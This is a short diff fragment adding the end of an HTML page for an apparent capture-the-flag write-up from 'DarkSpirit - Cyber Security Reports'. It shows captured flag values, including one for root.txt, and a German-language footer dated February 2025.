+                    <div class="flag-value"><span class="password">45edaec653ff9ee06236b7ce72b86963</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">root.txt</div>
+                    <div class="flag-value"><span class="password">bf89ea3ea01992353aef1f576214d4e4</span></div>
+                </div>
+            </div>
+        </section>
+
+    </div> <!-- Ende .container -->
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 10. Februar 2025</p> <!-- Datum extrahiert -->
+    </footer>
+</body>
+</html>
